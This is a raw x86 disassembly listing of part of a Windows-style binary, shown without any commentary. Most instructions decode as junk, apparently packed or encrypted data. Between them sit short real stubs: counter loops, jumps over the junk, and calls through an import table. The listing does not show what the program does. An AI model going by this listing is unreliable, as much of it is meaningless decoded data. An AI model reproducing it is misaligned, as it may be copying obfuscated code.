  40678e:	push   eax
  40678f:	adc    dl,dl
  406791:	xor    al,0xc6
  406793:	fimul  WORD PTR [edx+0x7645b7cc]
  406799:	jle    0x406796
  40679b:	scas   eax,DWORD PTR es:[edi]
  40679c:	sub    DWORD PTR [eax+eax*8-0x47],edi
  4067a0:	shl    al,0x2b
  4067a3:	dec    edi
  4067a4:	mov    edx,0xc0125a73
  4067a9:	adc    DWORD PTR [ebp*4+0x4b1d5398],0x43
  4067b1:	sub    bl,BYTE PTR [ecx-0xaaa95c6]
  4067b7:	and    DWORD PTR ds:0x64cc156b,0x7188d8a7
  4067c1:	lahf   
  4067c2:	gs mov ah,0xf1
  4067c5:	out    0xa1,al
  4067c7:	push   cs
  4067c8:	pop    es
  4067c9:	push   edx
  4067ca:	cmp    BYTE PTR [eax],al
  4067cc:	call   0xda75:0x10e5edcb
  4067d3:	add    esp,DWORD PTR [ebx+0x51]
  4067d6:	sahf   
  4067d7:	sub    DWORD PTR [ecx+0x207b13aa],ebp
  4067dd:	lods   al,BYTE PTR ds:[esi]
  4067de:	dec    DWORD PTR [edx]
  4067e0:	cs add eax,0xda57182
  4067e6:	repnz sub al,0x3a
  4067e9:	gs dec edx
  4067eb:	stos   DWORD PTR es:[di],eax
  4067ed:	mov    dh,0x76
  4067ef:	into   
  4067f0:	test   BYTE PTR [edx],ah
  4067f2:	pop    es
  4067f3:	xor    DWORD PTR [esi+0x7639f687],eax
  4067f9:	push   eax
  4067fa:	mov    ds:0x4b54a1db,eax
  4067ff:	in     al,0x21
  406801:	enter  0xc21e,0xac
  406805:	std    
  406806:	call   0xe3f7:0xf92f6eb1
  40680d:	xor    ch,bh
  40680f:	stos   BYTE PTR es:[edi],al
  406810:	xor    al,BYTE PTR [ebx-0x6e0e9746]
  406816:	jnp    0x406804
  406818:	add    esp,DWORD PTR [ecx]
  40681a:	or     edx,edi
  40681c:	pop    ebp
  40681d:	mov    bh,dh
  40681f:	cmp    ebp,DWORD PTR [ecx-0x551dec5d]
  406825:	xchg   DWORD PTR [edi+0x54],eax
  406828:	mov    al,ds:0x2724ff9e
  40682d:	xor    BYTE PTR [edx-0x78],0x73
  406831:	ins    DWORD PTR es:[edi],dx
  406832:	cmp    BYTE PTR [esp],bh
  406835:	loope  0x4068a2
  406837:	mov    ebp,0xc13fabaa
  40683c:	xor    esi,DWORD PTR [ecx-0x7d]
  40683f:	aaa    
  406840:	(bad)  
  406841:	(bad)  
  406842:	imul   DWORD PTR [eax+0x5ffe674a]
  406848:	test   cl,cl
  40684a:	iret   
  40684b:	push   ds
  40684c:	cmp    eax,edi
  40684e:	mov    bh,0xc1
  406850:	(bad)  
  406851:	enter  0xab5,0x99
  406855:	retf   0x8c8b
  406858:	lds    ebx,FWORD PTR [esi]
  40685a:	jg     0x406893
  40685c:	sub    ebx,DWORD PTR [edx]
  40685e:	imul   eax,DWORD PTR ds:0x6ce5281b,0xbf965168
  406868:	and    edx,DWORD PTR [eax]
  40686a:	out    0x16,eax
  40686c:	mov    al,0x88
  40686e:	mov    al,0x14
  406870:	push   esp
  406871:	(bad)  
  406873:	test   BYTE PTR ds:0xb549b6f,al
  406879:	ret    
  40687a:	adc    eax,0x5ec5b66e
  40687f:	pop    esp
  406880:	dec    esi
  406881:	ins    DWORD PTR es:[edi],dx
  406882:	lock rcl ebp,0xf
  406886:	pop    edi
  406887:	retf   
  406888:	sbb    BYTE PTR [esp+edx*2],bl
  40688b:	mov    dl,0xcc
  40688d:	stc    
  40688e:	mov    esp,0xcf681068
  406893:	test   eax,0x40ac26da
  406898:	call   0x3112:0x7f7c66fd
  40689f:	jns    0x406875
  4068a1:	cmp    BYTE PTR [eax-0x1f],dl
  4068a4:	jmp    0x563112ba
  4068a9:	mov    dh,BYTE PTR [edx+0x6b4e8d6]
  4068af:	ja     0x40683a
  4068b1:	out    0x32,al
  4068b3:	jmp    0x4068c1
  4068b5:	jecxz  0x406841
  4068b7:	test   DWORD PTR [ecx-0x3796f87c],ebp
  4068bd:	dec    edi
  4068be:	std    
  4068bf:	daa    
  4068c0:	push   edx
  4068c1:	jne    0x40684f
  4068c3:	cdq    
  4068c4:	sub    eax,0xd7076c7b
  4068c9:	adc    ecx,DWORD PTR [ebp-0x16]
  4068cc:	mov    ah,0x4f
  4068ce:	addr16 cdq 
  4068d0:	and    dl,ah
  4068d2:	pop    esi
  4068d3:	xor    eax,0x18c25d
  4068d8:	push   ebp
  4068d9:	mov    ebp,esp
  4068db:	sub    esp,0x58
  4068de:	mov    DWORD PTR ds:0x42a7bd,0x1f
  4068e8:	cmp    DWORD PTR ds:0x42a7bd,0x0
  4068ef:	je     0x406947
  4068f5:	cmp    DWORD PTR ds:0x42a7bd,0x8
  4068fc:	jne    0x406916
  406902:	push   DWORD PTR [ebp-0x1c]
  406905:	push   DWORD PTR [ebp-0x24]
  406908:	push   0x42aaaa
  40690d:	push   DWORD PTR [ebp-0x10]
  406910:	call   DWORD PTR ds:0x41d18c
  406916:	cmp    DWORD PTR ds:0x42a7bd,0x9
  40691d:	jne    0x406931
  406923:	xor    eax,eax
  406925:	or     eax,DWORD PTR ds:0x42a7bd
  40692b:	dec    eax
  40692c:	mov    ds:0x42a7bd,eax
  406931:	mov    eax,ds:0x42a7bd
  406936:	dec    eax
  406937:	mov    ds:0x42a7bd,eax
  40693c:	jmp    0x4068e8
  406941:	and    DWORD PTR ds:0x42a769,edx
  406947:	mov    ecx,DWORD PTR [ebp+0x8]
  40694a:	jmp    0x406c53
  40694f:	int3   
  406950:	(bad)
  406953:	(bad)  
  406955:	fcmove st,st(1)
  406957:	in     eax,dx
  406958:	loop   0x406947
  40695a:	out    dx,eax
  40695b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40695c:	in     al,dx
  40695d:	lea    esi,[edi+0x0]
  406960:	leave  
  406961:	js     0x4069db
  406963:	fs jle 0x4069de
  406966:	js     0x4069a3
  406968:	std    
  406969:	shl    esp,0x21
  40696c:	pop    ds
  40696d:	call   0xf3f8:0xfbe31365
  406974:	sub    BYTE PTR [edx-0x2d0af75e],dh
  40697a:	add    cl,BYTE PTR [ebx+0x12c34e0e]
  406980:	adc    al,0xf2
  406982:	pop    eax
  406983:	dec    esp
  406984:	bnd je 0x4069ef
  406987:	outs   dx,BYTE PTR ds:[esi]
  406988:	pop    ds
  406989:	xor    al,0xf4
  40698b:	test   BYTE PTR [edi],ah
  40698d:	push   ss
  40698e:	mov    ecx,0xf55991f9
  406993:	sti    
  406994:	dec    eax
  406995:	hlt    
  406996:	not    DWORD PTR [eax+ecx*2+0x57]
  40699a:	push   ecx
  40699b:	mov    bl,BYTE PTR [eax+0x58]
  40699e:	out    0x48,al
  4069a0:	add    cl,cl
  4069a2:	sub    al,0x30
  4069a4:	xor    bh,BYTE PTR [edi]
  4069a6:	add    DWORD PTR [eax],esp
  4069a8:	adc    eax,esp
  4069aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069ab:	std    
  4069ac:	push   ss
  4069ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069ae:	sar    cl,0x5
  4069b1:	scas   eax,DWORD PTR es:[edi]
  4069b2:	push   eax
  4069b3:	repnz and cl,ch
  4069b6:	sti    
  4069b7:	push   eax
  4069b8:	jle    0x4069d4
  4069ba:	test   edx,eax
  4069bc:	jae    0x4069fa
  4069be:	push   esp
  4069bf:	lea    esi,[eax+0x64bc92b]
  4069c5:	or     bl,BYTE PTR gs:[ebx-0x7edfdb2a]
  4069cc:	pop    ecx
  4069cd:	in     eax,0x31
  4069cf:	sbb    BYTE PTR [edx+edi*8],ch
  4069d2:	mov    ch,0xda
  4069d4:	fild   WORD PTR [ebx+edx*1]
  4069d7:	cmp    DWORD PTR [edx+0x68def943],esi
  4069dd:	and    bh,0x46
  4069e0:	arpl   di,di
  4069e2:	mov    eax,ds:0xc44ebe85
  4069e7:	pop    edi
  4069e8:	cmp    al,0xa0
  4069ea:	xchg   esi,eax
  4069eb:	maskmovq mm3,(bad)
  4069ec:	neg    DWORD PTR [edi+esi*2-0x715c79c7]
  4069f3:	ins    BYTE PTR es:[edi],dx
  4069f4:	adc    bl,BYTE PTR [esi]
  4069f6:	sbb    DWORD PTR [edx],esp
  4069f8:	jecxz  0x406a0c
  4069fa:	inc    esp
  4069fb:	mov    DWORD PTR [esi+0x52],0x10d9e43d
  406a02:	test   BYTE PTR [ebx+0x5a],0x78
  406a06:	xchg   DWORD PTR [ecx+esi*8-0x504ced68],ebx
  406a0d:	push   ebx
  406a0e:	push   ecx
  406a0f:	cmp    esp,edi
  406a11:	sub    dl,BYTE PTR [esi-0x1c]
  406a14:	xchg   esi,eax
  406a15:	mov    cl,0x31
  406a17:	je     0x406a5e
  406a19:	mov    dh,0x5a
  406a1c:	int    0xf3
  406a1e:	cmp    ecx,DWORD PTR [ebp+0x20e4dce3]
  406a24:	push   esi
  406a25:	not    ecx
  406a27:	and    esi,DWORD PTR [ebp-0x77]
  406a2a:	sbb    al,0xd
  406a2c:	outs   dx,BYTE PTR ds:[esi]
  406a2d:	mov    ebx,0xdfb06ebd
  406a32:	nop
  406a33:	mov    ebx,DWORD PTR [ebx+ebx*1]
  406a36:	push   es
  406a37:	jns    0x406a8c
  406a39:	dec    edi
  406a3a:	in     eax,0x97
  406a3c:	dec    ebp
  406a3d:	push   ebx
  406a3e:	mov    DWORD PTR [eax+0x4455b21c],esp
  406a44:	jmp    0xb9c4:0x3f0a756b
  406a4b:	mov    edx,0xeb431bf4
  406a50:	adc    ebx,edi
  406a52:	push   cs
  406a53:	and    edx,ecx
  406a55:	sti    
  406a56:	lock je 0x406ad8
  406a59:	xchg   DWORD PTR [edi-0x44],ebp
  406a5c:	(bad)  
  406a5d:	sti    
  406a5e:	and    DWORD PTR [edx+0x4f],edi
  406a61:	loope  0x406ad2
  406a63:	rcr    DWORD PTR [edi-0x2d226a1b],1
  406a69:	icebp  
  406a6a:	jl     0x406aac
  406a6c:	mov    ecx,eax
  406a6e:	fisttp WORD PTR [ecx]
  406a70:	cs (bad) 
  406a73:	and    BYTE PTR [esi+0xd],ah
  406a76:	icebp  
  406a77:	(bad)  
  406a78:	fisttp WORD PTR [edi-0x5e]
  406a7b:	or     eax,0xd876be24
  406a80:	add    DWORD PTR [edx],esp
  406a82:	scas   eax,DWORD PTR es:[edi]
  406a83:	je     0x406a7e
  406a85:	jle    0x406a60
  406a87:	xlat   BYTE PTR ds:[ebx]
  406a88:	dec    ebx
  406a89:	and    ecx,DWORD PTR ds:0x63ca8c2d
  406a8f:	sar    BYTE PTR [edx+0x6fd36c3],0x86
  406a96:	and    DWORD PTR [ecx+0x3d],eax
  406a99:	jns    0x406a7e
  406a9b:	mov    BYTE PTR [edi+eiz*2+0x7e2d4dc4],cl
  406aa2:	popf   
  406aa3:	in     al,0xdf
  406aa5:	xchg   edi,eax
  406aa6:	pop    edi
  406aa7:	into   
  406aa8:	loop   0x406a3a
  406aaa:	leave  
  406aab:	(bad)  
  406aac:	lock or BYTE PTR [esi+0x4f],0xf2
  406ab1:	adc    edi,DWORD PTR [esi-0xd40308a]
  406ab7:	xor    BYTE PTR [ecx-0x71],bl
  406aba:	and    eax,0x50c9e38b
  406abf:	sti    
  406ac0:	int    0x60
  406ac2:	inc    esi
  406ac3:	mov    ebx,0x2164320d
  406ac8:	jle    0x406b02
  406aca:	jecxz  0x406aa0
  406acc:	stos   DWORD PTR es:[edi],eax
  406acd:	mov    ch,0x5c
  406acf:	or     DWORD PTR [edx+0x7c271956],0xb449867d
  406ad9:	cmp    ecx,DWORD PTR [ebx]
  406adb:	outs   dx,DWORD PTR ds:[esi]
  406adc:	xor    eax,0x45e4cd8c
  406ae1:	push   eax
  406ae2:	lahf   
  406ae3:	add    BYTE PTR [ebp+0x3],bl
  406ae6:	push   ds
  406ae7:	test   BYTE PTR [ebx+0x3dcdd343],al
  406aed:	add    DWORD PTR [eax],edi
  406aef:	and    bh,dh
  406af1:	xchg   edi,eax
  406af2:	mov    esi,0xf59f2ce2
  406af7:	leave  
  406af8:	out    0x9,eax
  406afa:	es stos DWORD PTR es:[edi],eax
  406afc:	xor    DWORD PTR ds:[ebp*1-0x626174c1],esp
  406b04:	sbb    BYTE PTR [ebx-0x54c455f0],ah
  406b0a:	sub    DWORD PTR [edx-0x3a42161b],ebx
  406b10:	inc    ecx
  406b11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b12:	jmp    0x406b54
  406b14:	mov    DWORD PTR [ecx],0x37d3f619
  406b1a:	cmp    DWORD PTR [edx+0x6b],edx
  406b1d:	mov    eax,ds:0x67a589e8
  406b22:	push   ds
  406b23:	cmp    edx,DWORD PTR es:[edx-0x42]
  406b27:	data16 xor al,0xeb
  406b2a:	int3   
  406b2b:	(bad)  
  406b2d:	fld    TBYTE PTR [ecx-0x4d]
  406b30:	jmp    0xec3:0xba8376e2
  406b37:	jb     0x406b5c
  406b39:	(bad)  
  406b3a:	in     al,0x1f
  406b3c:	add    cl,BYTE PTR [eax+0x64]
  406b3f:	push   es
  406b40:	and    bh,BYTE PTR [ecx]
  406b42:	cmc    
  406b43:	dec    eax
  406b44:	test   BYTE PTR [esi],bh
  406b46:	mov    eax,ds:0xf1c613d7
  406b4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b4c:	aam    0xf7
  406b4e:	dec    eax
  406b4f:	mov    bh,0xe8
  406b51:	xchg   ebp,eax
  406b52:	inc    ecx
  406b53:	push   0xffffffdf
  406b55:	adc    edx,DWORD PTR [eax+0x1d]
  406b58:	mov    ch,BYTE PTR [ecx+0x74eea211]
  406b5e:	or     DWORD PTR [edx+0x3256fbd5],ebx
  406b64:	mov    esi,0x7f95285
  406b69:	mov    edx,0xfb94ebeb
  406b6e:	push   ss
  406b6f:	shr    BYTE PTR [esi+0x1c],0x7e
  406b73:	mul    BYTE PTR [ecx-0x613ceb1e]
  406b79:	push   esi
  406b7a:	inc    eax
  406b7b:	in     al,0xbd
  406b7d:	jo     0x406bf1
  406b7f:	gs jns 0x406b94
  406b82:	fnstsw WORD PTR [edi+0x30]
  406b85:	scas   eax,DWORD PTR es:[edi]
  406b86:	repnz jmp 0x7724:0xeba6d98a
  406b8e:	inc    ebp
  406b8f:	or     eax,0x94cef1b4
  406b94:	arpl   WORD PTR [esi],bx
  406b96:	aas    
  406b97:	jbe    0x406b8e
  406b99:	adc    eax,0xf0f26b91
  406b9e:	mov    cl,0xbe
  406ba0:	(bad)  
  406ba1:	lods   eax,DWORD PTR ds:[esi]
  406ba2:	enter  0xc6bc,0x67
  406ba6:	mov    ds:0x51985c86,eax
  406bab:	dec    eax
  406bac:	scas   eax,DWORD PTR es:[edi]
  406bad:	nop
  406bae:	mov    ebp,0x5bc70a4e
  406bb3:	cli    
  406bb4:	push   ebp
  406bb5:	outs   dx,DWORD PTR ds:[esi]
  406bb6:	inc    ebp
  406bb7:	cmc    
  406bb8:	cmp    ah,0xb3
  406bbb:	sub    BYTE PTR [edx-0x36e1d34d],bl
  406bc1:	out    0xeb,al
  406bc3:	repnz cld 
  406bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bc6:	xchg   edx,eax
  406bc7:	pop    ecx
  406bc8:	sar    DWORD PTR [ebx+0x6b],cl
  406bcb:	imul   edi,DWORD PTR [eax],0xc5c4258
  406bd1:	pushf  
  406bd2:	aas    
  406bd3:	xchg   DWORD PTR [ebx],eax
  406bd5:	inc    esp
  406bd6:	pop    ds
  406bd7:	mov    bl,0x48
  406bd9:	add    BYTE PTR [ebp-0x13],bh
  406bdc:	add    al,0xfa
  406bde:	(bad)  
  406bdf:	cmp    eax,0xf42082fd
  406be4:	(bad)  
  406be5:	mov    cl,0x45
  406be7:	jae    0x406bb9
  406be9:	mov    DWORD PTR [ecx-0xe],ebx
  406bec:	in     al,dx
  406bed:	jns    0x406be9
  406bef:	mov    ebx,DWORD PTR [edi+esi*2-0x707e7fac]
  406bf6:	rcr    BYTE PTR [eax+0x6b],1
  406bf9:	xor    DWORD PTR [esi+0xf34d34a],ecx
  406bff:	call   0x2ec0:0xa0780f77
  406c06:	shr    DWORD PTR [edx-0x5a598182],0x15
  406c0d:	ficom  WORD PTR [esi+0x3091bc88]
  406c13:	std    
  406c14:	and    BYTE PTR [ebp-0x77e77c49],0x9d
  406c1b:	xor    ebx,eax
  406c1d:	xchg   BYTE PTR [ecx+ecx*2+0x5b],bl
  406c21:	pusha  
  406c22:	mov    dl,0x86
  406c24:	pop    ecx
  406c25:	xchg   esi,eax
  406c26:	inc    edx
  406c27:	and    DWORD PTR [edx],0xffffffed
  406c2a:	(bad)  
  406c2b:	je     0x406bf4
  406c2d:	pop    esi
  406c2e:	push   ecx
  406c2f:	aad    0xae
  406c31:	mov    dl,0xa7
  406c33:	inc    ebx
  406c34:	retf   0x7a85
  406c37:	dec    ebx
  406c38:	xor    al,0x2e
  406c3a:	or     dl,bl
  406c3c:	(bad)
  406c3f:	pop    ebp
  406c40:	inc    edx
  406c41:	popa   
  406c42:	dec    edi
  406c43:	and    eax,0x8020d830
  406c48:	and    esp,ebp
  406c4a:	ret    0xb3e6
  406c4d:	inc    eax
  406c4e:	fs fs rcr al,0x64
  406c53:	mov    eax,0x8a36
  406c58:	adc    DWORD PTR ds:0x42a7c9,0x4fea
  406c62:	xor    ax,WORD PTR [ecx+0x20]
  406c66:	sub    DWORD PTR ds:0x42a7f5,0x417a
  406c70:	mov    ecx,0x3afc
  406c75:	xor    DWORD PTR ds:0x42a84d,0x2c9d
  406c7f:	jmp    0x406f88
  406c84:	rol    dh,cl
  406c86:	cmp    al,0xd3
  406c88:	aam    0xd9
  406c8a:	rol    ebp,1
  406c8c:	mov    eax,ebx
  406c8e:	and    DWORD PTR [ecx-0x48],ebx
  406c91:	test   eax,0xcf6c9e5b
  406c96:	js     0x406d10
  406c98:	fs jle 0x406d13
  406c9b:	js     0x406d04
  406c9d:	fisttp WORD PTR [edx+edi*8]
  406ca0:	xor    eax,0x16274f4a
  406ca5:	imul   DWORD PTR ds:0x10884405
  406cab:	scas   eax,DWORD PTR es:[edi]
  406cac:	lds    ebp,FWORD PTR [ebx-0x29dc6c7c]
  406cb2:	fnstenv [eax+edx*2-0x3bca92a7]
  406cb9:	sub    BYTE PTR [edx+0x1c],0xeb
  406cbd:	test   eax,ebx
  406cbf:	fcomi  st,st(6)
  406cc1:	cmp    BYTE PTR [ecx+0x36],dl
  406cc4:	out    dx,al
  406cc5:	int3   
  406cc6:	imul   esi,DWORD PTR [edx+eiz*8+0x75],0x3ebf9c5c
  406cce:	mov    bl,0x4
  406cd0:	xchg   edx,eax
  406cd1:	pop    ss
  406cd2:	lods   eax,DWORD PTR ds:[si]
  406cd4:	add    al,0xdb
  406cd6:	call   0x527c:0xe22c908b
  406cdd:	xor    DWORD PTR [ebx-0x79],ebx
  406ce0:	push   edx
  406ce1:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ce3:	pushf  
  406ce4:	rcl    DWORD PTR [edx-0x25656eec],0xf5
  406ceb:	adc    eax,DWORD PTR [ebp+0x62]
  406cee:	cwde   
  406cef:	add    DWORD PTR [edi],esi
  406cf1:	push   ds
  406cf2:	lock es ds jmp 0x993:0xd67221f
  406cfc:	mov    al,0x33
  406cfe:	mov    esp,0xf1b903da
  406d03:	ja     0x406cb5
  406d05:	sbb    eax,0xa854b18b
  406d0a:	cmp    al,0xf1
  406d0c:	xor    BYTE PTR [edi+0x52],al
  406d0f:	mov    cl,0x5f
  406d11:	xor    BYTE PTR [esi+0x27],0x6c
  406d15:	div    DWORD PTR [edi+0x1c014ce5]
  406d1b:	lea    esp,[ebx+0x68]
  406d1e:	mov    eax,0x2921d114
  406d23:	mov    edi,0xcbeb7908
  406d28:	out    dx,al
  406d29:	adc    eax,DWORD PTR [esi+0x0]
  406d2c:	loope  0x406ceb
  406d2e:	push   es
  406d2f:	mov    ebp,0x6ebea84c
  406d34:	std    
  406d35:	mov    edx,0x421dec27
  406d3a:	in     al,0xcb
  406d3c:	int    0xad
  406d3e:	xchg   edi,eax
  406d3f:	or     eax,0xef6a6ab2
  406d44:	push   eax
  406d45:	fisub  DWORD PTR [edx]
  406d47:	pusha  
  406d48:	das    
  406d49:	fimul  DWORD PTR [eax]
  406d4b:	xchg   dh,cl
  406d4d:	mov    ebx,0x5f4bdeb
  406d52:	sbb    al,0x9b
  406d54:	and    al,0x66
  406d56:	dec    esp
  406d57:	ins    BYTE PTR es:[edi],dx
  406d58:	push   es
  406d59:	pop    es
  406d5a:	idiv   DWORD PTR [esi+edx*4-0x38]
  406d5e:	mov    al,0x76
  406d60:	push   esp
  406d61:	sar    dl,cl
  406d63:	fst    DWORD PTR [eax+eax*1-0x17]
  406d67:	xor    DWORD PTR [edx+eax*1],0xfffffff8
  406d6b:	mov    ecx,0x9636f06f
  406d70:	adc    eax,0xa888a5f
  406d75:	mul    DWORD PTR [esi]
  406d77:	mov    eax,0x9a30a4db
  406d7c:	mov    dh,0x72
  406d7e:	xchg   esi,eax
  406d7f:	cs inc ebp
  406d81:	cmc    
  406d82:	aas    
  406d83:	xor    DWORD PTR [esp+ecx*1],0x5e
  406d87:	xor    bh,BYTE PTR [edx-0x27557989]
  406d8d:	outs   dx,DWORD PTR ds:[esi]
  406d8e:	mov    eax,0x9d37381a
  406d93:	shl    eax,0x54
  406d96:	stos   DWORD PTR es:[edi],eax
  406d97:	xchg   edi,eax
  406d98:	mov    esp,DWORD PTR [esi-0x1609e8f7]
  406d9e:	js     0x406e0c
  406da0:	outs   dx,DWORD PTR ds:[esi]
  406da1:	je     0x406d87
  406da3:	repz retf 0x78c9
  406da7:	mov    eax,ds:0x565c936b
  406dac:	data16 int3 
  406dae:	xchg   DWORD PTR [ecx-0x1974ade9],esp
  406db4:	xor    ecx,ebp
  406db6:	inc    esi
  406db7:	popf   
  406db8:	lods   eax,DWORD PTR ds:[esi]
  406db9:	jmp    0x13f98bbc
  406dbe:	pop    ebp
  406dbf:	mov    ebp,0x9ded46eb
  406dc4:	dec    ebp
  406dc5:	retf   
  406dc6:	cmp    eax,0x9f04bb0f
  406dcb:	xchg   ebx,eax
  406dcc:	jae    0x406de8
  406dce:	inc    edi
  406dcf:	fnstenv [edi]
  406dd1:	enter  0xc15d,0xc
  406dd5:	shl    BYTE PTR [esi+0x1153d42b],0xc3
  406ddc:	bound  esp,QWORD PTR [edx-0x3440ad]
  406de2:	mov    WORD PTR [eax],gs
  406de4:	dec    ebx
  406de5:	dec    edx
  406de6:	pop    edi
  406de7:	outs   dx,BYTE PTR ds:[esi]
  406de8:	xor    cl,BYTE PTR [eax-0xf]
  406deb:	nop
  406dec:	lahf   
  406ded:	mov    eax,0xce28b66c
  406df2:	ret    0x23a8
  406df5:	xor    BYTE PTR [edi+0x78],0x5f
  406df9:	mov    esp,0xf9f471e8
  406dfe:	add    DWORD PTR [eax],ecx
  406e00:	and    cl,0x7f
  406e03:	fsub   st,st(4)
  406e05:	ds mov eax,0x9b24f390
  406e0b:	lock sbb cl,cl
  406e0e:	cmp    al,0x47
  406e10:	mov    bl,ah
  406e12:	retf   0x2257
  406e15:	addr16 cmc 
  406e17:	adc    eax,0x6c7eb086
  406e1c:	pop    ss
  406e1d:	mov    ?,WORD PTR [ebp-0x2f]
  406e20:	or     DWORD PTR [esi+0x5e],eax
  406e23:	stos   BYTE PTR es:[edi],al
  406e24:	ja     0x406dea
  406e26:	and    dh,BYTE PTR [ecx]
  406e28:	stos   DWORD PTR es:[edi],eax
  406e29:	adc    al,0x53
  406e2b:	mov    al,ds:0xfa4b0b1
  406e30:	xor    ecx,DWORD PTR [edi-0x27]
  406e33:	js     0x406e1f
  406e35:	mov    ds:0x29c071e,al
  406e3a:	mov    ebp,0xde0c5b4c
  406e3f:	push   fs
  406e41:	retf   0xb5a5
  406e44:	std    
  406e45:	popa   
  406e46:	ror    DWORD PTR [ebx-0x424b4f96],1
  406e4c:	ins    BYTE PTR es:[edi],dx
  406e4d:	fs push esp
  406e4f:	fcmovnu st,st(4)
  406e51:	pop    edi
  406e52:	rcl    ch,1
  406e54:	fs or  eax,0x95651868
  406e5a:	dec    esp
  406e5b:	pushf  
  406e5c:	loope  0x406e21
  406e5e:	or     eax,0xf98af543
  406e63:	xchg   BYTE PTR [esi+0x64634387],bl
  406e69:	fisub  WORD PTR [eax]
  406e6b:	mov    ch,0x6b
  406e6d:	add    ecx,DWORD PTR [edi-0x4c]
  406e70:	dec    ecx
  406e71:	adc    esp,DWORD PTR [ebp+0x41]
  406e74:	jb     0x406e44
  406e76:	scas   eax,DWORD PTR es:[edi]
  406e77:	pop    ecx
  406e78:	pop    eax
  406e79:	neg    DWORD PTR [esp+ebp*1]
  406e7c:	imul   BYTE PTR [eax+0x6b]
  406e7f:	add    ebp,DWORD PTR [ecx+0x5e]
  406e82:	sbb    edi,0x16b45cad
  406e88:	xchg   edi,eax
  406e89:	add    DWORD PTR [ebx+edi*8-0x28fbcddd],ebx
  406e90:	jo     0x406ece
  406e92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e93:	fcmovne st,st(3)
  406e95:	adc    BYTE PTR [eax-0x61],dh
  406e98:	mov    BYTE PTR [edi],bl
  406e9a:	pop    ebx
  406e9b:	push   0x4f
  406e9d:	fmul   DWORD PTR [ecx]
  406e9f:	pushf  
  406ea0:	cld    
  406ea1:	cmc    
  406ea2:	sub    dh,0x7f
  406ea5:	call   0x857053d3
  406eaa:	lea    esp,[edx-0x7e]
  406ead:	xor    al,0x24
  406eaf:	adc    DWORD PTR [ebx-0x71],esi
  406eb2:	cmp    edx,eax
  406eb4:	bnd jl 0x406e86
  406eb7:	mov    eax,edi
  406eb9:	iret   
  406eba:	std    
  406ebb:	cmc    
  406ebc:	sub    al,0x96
  406ebe:	sub    dh,BYTE PTR [esp+edx*4]
  406ec1:	cmp    al,BYTE PTR [ebx-0x133a2871]
  406ec7:	dec    ebx
  406ec8:	test   BYTE PTR [edx-0x49],ah
  406ecb:	pop    ecx
  406ecc:	cdq    
  406ecd:	gs cmp dh,dl
  406ed0:	xchg   ebx,eax
  406ed1:	ss mov bh,0x63
  406ed4:	pushf  
  406ed5:	xchg   esp,eax
  406ed6:	pop    eax
  406ed7:	xchg   ebp,eax
  406ed8:	inc    esi
  406ed9:	cwde   
  406eda:	inc    edi
  406edb:	int3   
  406edc:	aam    0x15
  406ede:	cwde   
  406edf:	adc    eax,ebx
  406ee1:	shl    DWORD PTR [ebx+0x7004e5de],1
  406ee7:	cmp    BYTE PTR [ecx-0x59],bl
  406eea:	add    edx,DWORD PTR [ebx]
  406eec:	mov    esp,DWORD PTR [edi+0x5f016e6d]
  406ef2:	test   al,0xfa
  406ef4:	enter  0x3a8d,0x86
  406ef8:	push   ecx
  406ef9:	test   eax,0x3ffef453
  406efe:	xlat   BYTE PTR ds:[ebx]
  406eff:	test   al,0xa2
  406f01:	rol    DWORD PTR [ecx+0x1e],cl
  406f04:	inc    edx
  406f05:	mov    cl,0xd2
  406f07:	jb     0x406f77
  406f09:	jns    0x406ecb
  406f0b:	lahf   
  406f0c:	dec    esi
  406f0d:	jmp    0xac5dfa4a
  406f12:	adc    BYTE PTR [ecx],ch
  406f14:	push   edx
  406f15:	scas   eax,DWORD PTR es:[edi]
  406f16:	push   ecx
  406f17:	mov    dh,0x73
  406f19:	mov    cl,0x73
  406f1b:	frstor [eax-0x2a6b9e05]
  406f22:	inc    esp
  406f23:	nop
  406f24:	ja     0x406ec6
  406f26:	mov    ecx,0x33679f9e
  406f2b:	ja     0x406ed8
  406f2d:	leave  
  406f2e:	das    
  406f2f:	sub    DWORD PTR [edi-0x3c],esi
  406f32:	xchg   ecx,eax
  406f33:	jl     0x406fad
  406f35:	jns    0x406ecc
  406f37:	xchg   esp,eax
  406f38:	xchg   DWORD PTR [edi-0x4bf65667],ebx
  406f3e:	lock xor BYTE PTR [edi+eax*1-0x29],dh
  406f43:	mov    edi,esi
  406f45:	jecxz  0x406f61
  406f47:	mov    BYTE PTR [ecx-0x4876ccba],0x92
  406f4e:	into   
  406f4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f50:	frstor [ebx]
  406f52:	sbb    al,0x79
  406f54:	sub    al,0x4f
  406f56:	lods   eax,DWORD PTR ds:[esi]
  406f57:	mov    ds:0xe3c31120,eax
  406f5c:	clc    
  406f5d:	mov    edi,0x24d31666
  406f62:	or     bl,BYTE PTR [esi+ebx*4+0x14]
  406f66:	icebp  
  406f67:	hlt    
  406f68:	fnstenv [eax+edx*1-0x70]
  406f6c:	push   es
  406f6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f6e:	and    al,0xd0
  406f70:	mov    dh,0xaf
  406f72:	jmp    0x2adc2661
  406f77:	pop    ebp
  406f78:	test   al,0xd6
  406f7a:	push   eax
  406f7b:	dec    ebp
  406f7c:	jmp    0x914d90cb
  406f81:	cmp    ch,BYTE PTR [ecx+ecx*8+0x6e]
  406f85:	pushf  
  406f86:	int3   
  406f87:	imul   esp,DWORD PTR [esi+0x3],0xffffffc1
  406f8b:	sbb    ecx,DWORD PTR ds:0x42a881
  406f91:	movzx  eax,ax
  406f94:	and    DWORD PTR ds:0x42a885,0x0
  406f9e:	jmp    0x406fb0
  406fa3:	mov    ecx,DWORD PTR ds:0x42a885
  406fa9:	inc    ecx
  406faa:	mov    DWORD PTR ds:0x42a885,ecx
  406fb0:	cmp    DWORD PTR ds:0x42a885,0x11
  406fb7:	jae    0x407009
  406fbd:	cmp    DWORD PTR ds:0x42a885,0x7
  406fc4:	jne    0x406fe4
  406fca:	push   0x2396
  406fcf:	push   0x42ab22
